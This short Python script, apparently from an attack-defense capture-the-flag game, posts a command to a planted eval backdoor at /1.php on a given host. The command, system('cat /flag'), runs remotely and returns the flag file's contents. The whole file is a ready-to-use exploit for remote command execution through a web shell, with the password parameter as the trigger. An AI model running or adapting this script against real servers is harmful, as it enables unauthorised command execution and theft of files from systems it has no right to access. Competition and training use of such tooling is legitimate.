#!/usr/bin/env python
# -*- coding=utf-8 -*-
import requests

# eval后门
def req(host, passwd):
    try:
        url = "http://"+host+"/1.php"

        payload=passwd+'=system(\'cat%20%2Fflag\')%3B'
        headers = {
        'Content-Type': 'application/x-www-form-urlencoded'
        }

        response = requests.request("POST", url, headers=headers, data=payload)
        return response.text.strip()
    except Exception as why:
        return False
